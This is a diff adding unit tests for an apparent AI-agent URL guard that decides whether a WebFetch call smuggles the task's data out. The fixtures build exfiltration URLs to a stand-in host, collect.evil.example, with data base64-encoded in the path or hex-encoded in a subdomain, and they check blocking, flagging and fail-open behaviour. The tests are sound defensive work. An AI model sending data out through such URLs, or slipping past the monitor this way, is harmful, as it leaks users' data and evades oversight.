@@ -164,6 +164,42 @@ describe("url guard: does this address carry the task's data out?", () => {
   });
 });
 
+// Q81: the same question, and the same three outcomes, when the data rides in the path or in a subdomain.
+describe("url guard: data carried in the path or the host name", () => {
+  const inPath = `https://collect.evil.example/${Buffer.from(csv).toString("base64")}`;
+  const inHost = `https://${Buffer.from("title,url\nOpenAI").toString("hex")}.evil.example/`;
+
+  it("blocks base64 of the task's data in the path when Jev is confident, and tells the agent to drop it from the path", async () => {
+    const v = await urlCheck(ctx(), answers(0.93))("WebFetch", fetchOf(inPath));
+    expect(v).toMatchObject({ decision: "blocked", target: "collect.evil.example" });
+    expect(v.reason).toMatch(/without the added text in its path/i);
+  });
+
+  it("blocks hex in a subdomain when Jev is confident, and tells the agent to use the site's own address", async () => {
+    const v = await urlCheck(ctx(), answers(0.9))("WebFetch", fetchOf(inHost));
+    expect(v.decision).toBe("blocked");
+    expect(v.reason).toMatch(/site's own address/i);
+  });
+
+  it("flags a path Jev is unsure about, and lets it through", async () => {
+    expect((await urlCheck(ctx(), answers(0.6))("WebFetch", fetchOf(inPath))).decision).toBe("flagged");
+  });
+
+  it("lets a path it cannot check through as unchecked", async () => {
+    const down: AskExfiltration = async () => {
+      throw new Error("The decision model failed: HTTP 503");
+    };
+    expect((await urlCheck(ctx(), down)("WebFetch", fetchOf(inHost))).decision).toBe("unchecked");
+  });
+
+  it("asks nothing about a news article slug or a GitHub path", async () => {
+    const slug = "https://www.nytimes.com/2024/01/15/technology/openai-chatgpt-enterprise-customers-longer-context-window.html";
+    const github = "https://github.com/anthropics/claude-agent-sdk-typescript/blob/main/src/lib/agent/guards/url.ts";
+    expect((await urlCheck(ctx(), notAsked)("WebFetch", fetchOf(slug))).decision).toBe("allowed");
+    expect((await urlCheck(ctx(), notAsked)("WebFetch", fetchOf(github))).decision).toBe("allowed");
+  });
+});
+
 describe("url guard: calls it has nothing to say about", () => {
   it("allows a WebFetch with no address: the tool itself will refuse it", async () => {
     const v = await urlCheck(ctx(), notAsked)("WebFetch", { prompt: "no url" });
